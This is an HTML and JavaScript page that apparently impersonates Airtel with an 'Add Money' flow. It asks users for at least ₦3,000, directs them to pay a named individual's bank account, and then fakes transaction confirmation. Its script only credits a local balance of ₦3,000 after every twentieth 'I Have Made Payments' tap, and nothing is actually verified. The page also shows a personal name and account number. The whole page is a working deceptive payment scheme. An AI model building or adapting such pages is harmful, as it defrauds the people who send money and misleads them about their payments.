<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Add Money</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      box-sizing: border-box;
    }

    body {
      background: #fff;
      overflow-x: hidden;
      position: relative;
    }

    .airtel-logo {
      width: 80px;
      margin: 20px auto;
      display: block;
      z-index: 2;
      position: relative;
    }

    .background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: 0;
      pointer-events: none;
    }

    .float-logo {
      position: absolute;
      width: 20px;
      height: 20px;
      background: url('airtel-logo.png') no-repeat center;
      background-size: contain;
      opacity: 0.1;
      animation: float 15s infinite linear;
    }

    @keyframes float {
      0% {
        transform: translateY(100vh) scale(0.5);
        opacity: 0.1;
      }
      100% {
        transform: translateY(-10vh) scale(1);
        opacity: 0;
      }
    }

    .container {
      position: relative;
      z-index: 2;
      padding: 20px;
      text-align: center;
    }

    input {
      padding: 15px;
      font-size: 18px;
      width: 80%;
      border-radius: 10px;
      border: 1px solid #ccc;
      margin-bottom: 20px;
    }

    button {
      padding: 15px 30px;
      background: red;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .hidden {
      display: none;
    }

    .loader {
      margin: 30px auto;
      border: 5px solid #f3f3f3;
      border-top: 5px solid red;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .account-details {
      margin-top: 30px;
      background: #f9f9f9;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .popup {
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeeba;
      padding: 10px;
      margin: 10px auto;
      width: 80%;
      border-radius: 10px;
    }

    .dashboard-btn {
      margin-top: 20px;
      background: #444;
    }
  </style>
</head>
<body>

  <img src="airtel-logo.png" alt="Airtel Logo" class="airtel-logo" />

  <!-- Background animation -->
  <div class="background">
    <!-- Floating logos -->
    <script>
      for (let i = 0; i < 50; i++) {
        const logo = document.createElement('div');
        logo.classList.add('float-logo');
        logo.style.left = Math.random() * 100 + 'vw';
        logo.style.top = Math.random() * 100 + 'vh';
        logo.style.animationDelay = Math.random() * 10 + 's';
        document.querySelector('.background').appendChild(logo);
      }
    </script>
  </div>

  <div class="container">
    <div id="amount-section">
      <input type="number" id="amount" placeholder="Enter amount (min ₦3,000)" />
      <br />
      <button onclick="validateAmount()">Continue</button>
    </div>

    <div id="popup" class="popup hidden">Please input minimum of ₦3,000</div>

    <div id="loader" class="loader hidden"></div>

    <div id="account-section" class="hidden">
      <img src="airtel-logo.png" alt="Airtel Logo" class="airtel-logo" />
      <div class="account-details">
        <h3>Send Payment To:</h3>
        <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
        <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
        <p><strong>Account:</strong> 812 489 0070</p>
        <br />
        <button onclick="recordTap()">I Have Made Payments</button>
        <br />
        <button class="dashboard-btn" onclick="goToDashboard()">Return to Dashboard</button>
      </div>
    </div>
  </div>

  <script>
    let tapCount = parseInt(localStorage.getItem('tapCount') || 0);

    function validateAmount() {
      const amount = parseInt(document.getElementById('amount').value);
      const popup = document.getElementById('popup');
      if (amount < 3000) {
        popup.classList.remove('hidden');
      } else {
        popup.classList.add('hidden');
        showLoader();
      }
    }

    function showLoader() {
      document.getElementById('amount-section').classList.add('hidden');
      document.getElementById('loader').classList.remove('hidden');
      setTimeout(() => {
        document.getElementById('loader').classList.add('hidden');
        document.getElementById('account-section').classList.remove('hidden');
      }, 2000);
    }

    function recordTap() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);
      alert("Please wait, we are confirming your transaction...");
      if (tapCount % 20 === 0) {
        let balance = parseInt(localStorage.getItem('balance') || 0);
        balance += 3000;
        localStorage.setItem('balance', balance);
      }
    }

    function goToDashboard() {
      window.location.href = "dashboard.html";
    }
  </script>

</body>
</html>
